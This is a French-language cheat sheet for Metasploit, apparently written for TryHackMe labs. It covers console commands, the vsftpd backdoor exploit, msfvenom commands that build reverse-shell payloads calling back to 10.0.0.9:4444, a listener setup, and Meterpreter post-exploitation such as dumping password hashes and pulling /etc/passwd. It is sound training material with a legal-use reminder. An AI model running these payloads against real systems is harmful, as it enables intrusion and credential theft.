---
title: "Metasploit : le framework d'exploitation"
tags: [securite, reseau, terminal]
created: 2026-09-07
updated: 2026-09-09
status: stable
---

## En bref

Une base de milliers d'exploits, de charges utiles (*payloads*) et d'outils
auxiliaires, pilotée depuis une console. Le cycle qu'on rejoue à chaque fois :
**chercher un module → le sélectionner → régler ses options → lancer → gérer la
session obtenue.**

Metasploit vient *après* la reconnaissance : on arrive ici avec des ports et des
versions de services déjà trouvés par [nmap](../reseau/nmap.md).

## Lancer et se repérer

```sh
msfconsole -q          # -q supprime la banniere aleatoire
msfconsole -r fichier.rc   # rejouer une suite de commandes (automatisation)
```

Le cœur tient en cinq commandes, tapées **dans** la console `msf6 >` :

| Commande | Ce qu'elle fait |
| --- | --- |
| `search <mot>` | trouve un module (par CVE, service, nom) |
| `use <module>` | le sélectionne — le prompt affiche alors son nom |
| `info` | décrit le module sélectionné et ses options |
| `show options` | liste les réglages, et lesquels manquent (`Required = yes`) |
| `run` / `exploit` | le lance |

```text
search type:exploit vsftpd        recherche filtree par type et mot-cle
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 10.0.0.5
run
```

`search` numérote les résultats : `use 0` reprend le premier de la liste, plus
rapide que de recopier le chemin complet.

## Les options qui reviennent toujours

| Option | Sens | Exemple |
| --- | --- | --- |
| `RHOSTS` | la ou les cibles | `set RHOSTS 10.0.0.5` |
| `RPORT` | port de la cible | `set RPORT 8080` |
| `LHOST` | **ton** IP, où la cible se reconnecte | `set LHOST 10.0.0.9` |
| `LPORT` | port d'écoute local | `set LPORT 4444` |
| `PAYLOAD` | ce qu'on exécute une fois entré | `set PAYLOAD linux/x64/meterpreter/reverse_tcp` |

**`LHOST` est l'erreur numéro un.** Pour une charge *reverse*, la cible se
connecte vers toi : si `LHOST` porte ton IP publique alors que tu es sur un VPN
THM, rien ne revient. Sur les VM THM, `LHOST` = ton IP `tun0`.

```sh
ip addr show tun0 | grep inet    # trouver son IP sur le VPN THM
```

`setg` fixe une valeur **globale** (gardée entre les modules), pratique pour
`LHOST` qu'on ne veut pas retaper.

## Payloads : bind vs reverse, shell vs meterpreter

Deux choix indépendants.

- **reverse** : la cible se connecte à toi (traverse les pare-feu sortants) —
  le défaut à préférer. **bind** : tu te connectes à un port ouvert par la cible
  (bloqué si un pare-feu filtre l'entrée).
- **shell** : un simple interpréteur de commandes. **meterpreter** : une charge
  riche, en mémoire, avec des commandes prêtes (fichiers, hashs, pivot).

## Meterpreter : une fois dedans

Personne ne retient les 300 commandes de Meterpreter. Le réflexe qui remplace la
mémoire — et qui marche aussi au prompt `msf6 >` :

```text
help               toutes les commandes, groupees par categorie
help hashdump      l'usage d'UNE commande precise
get<Tab>           completion : montre getuid, getprivs, getpid, getsystem...
```

La liste ci-dessous est le noyau qu'on finit par avoir dans les doigts ; tout le
reste se retrouve par `help`.

```text
sysinfo            infos sur la machine compromise
getuid             sous quel compte on tourne
getprivs           privileges du jeton courant (Windows)
hashdump           extrait les hashs de comptes (a passer a john/hashcat)
shell              tomber dans un vrai shell systeme
upload outil.sh    envoyer un fichier
download /etc/passwd    recuperer un fichier
background         detacher la session sans la fermer
```

`background` renvoie au prompt `msf6 >` ; on retrouve la session ensuite.

## Gérer plusieurs sessions

```text
sessions -l        lister les sessions ouvertes
sessions -i 2      revenir dans la session 2
exploit -j         lancer en tache de fond (job), pour enchainer plusieurs cibles
jobs -l            lister les jobs (handlers en ecoute)
```

## msfvenom : fabriquer une charge autonome

Pour déposer une charge **hors** d'un exploit (fichier à faire exécuter par la
cible), c'est l'outil séparé `msfvenom`, en shell :

```sh
msfvenom -l payloads | grep meterpreter          # lister les charges disponibles
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.9 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.9 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.9 LPORT=4444 -f raw -o shell.php
```

Côté attaquant, il faut alors un **écouteur** (*handler*) prêt à recevoir la
connexion, dans msfconsole :

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.9
set LPORT 4444
run
```

Les `LHOST`/`LPORT`/`PAYLOAD` du handler doivent être **identiques** à ceux
passés à msfvenom, sinon la charge revient dans le vide.

## Base de données et reconnaissance intégrée

Metasploit s'appuie sur PostgreSQL pour mémoriser hôtes, services et
identifiants entre les modules.

```sh
sudo msfdb init         # initialiser la base (une fois)
```

```text
db_status          verifier la connexion a la base
workspace -a thm   isoler un engagement dans son propre espace
db_nmap -sV 10.0.0.5    lancer nmap depuis msf, resultats stockes en base
hosts              les hotes decouverts
services           les services, port par port
```

## Pièges

- **`LHOST` mal réglé = aucune connexion en retour.** C'est la panne la plus
  fréquente. Sur THM, c'est l'IP `tun0`, pas l'IP de la carte réseau locale.
- **Charge incompatible avec la cible.** Un payload `windows/…` sur une cible
  Linux ne rend jamais la main. Vérifier l'OS avant de choisir (`x64` vs `x86`
  compte aussi).
- **Le handler doit correspondre au msfvenom bit pour bit** : même payload,
  même `LHOST`, même `LPORT`. La moindre différence et la session ne s'ouvre pas.
- **`search` renvoie trop de résultats.** Filtrer : `search type:exploit
  platform:windows <service>`, ou coller directement la **CVE** vue au scan.
- **Un exploit qui « réussit » sans session** a souvent planté le service
  distant sans obtenir de shell. Relire la sortie : « session opened » est la
  seule preuve.
- **`exit` ferme la console et tue les sessions.** Pour sortir en gardant une
  session vivante, c'est `background`, pas `exit`.
- **Cadre légal, comme toujours.** Metasploit exécute du code sur une machine
  distante : on ne le pointe que sur ce qu'on est autorisé à attaquer (labo,
  THM, engagement signé).

## Voir aussi

- [nmap : scan de ports et découverte réseau](../reseau/nmap.md)
- [John the Ripper : casser des hachages hors ligne](john-the-ripper.md)
- [Maliciels, attaques et vocabulaire des menaces](menaces.md)
- [Lexique de l'évaluation de sécurité](lexique.md)
- <https://docs.metasploit.com/>
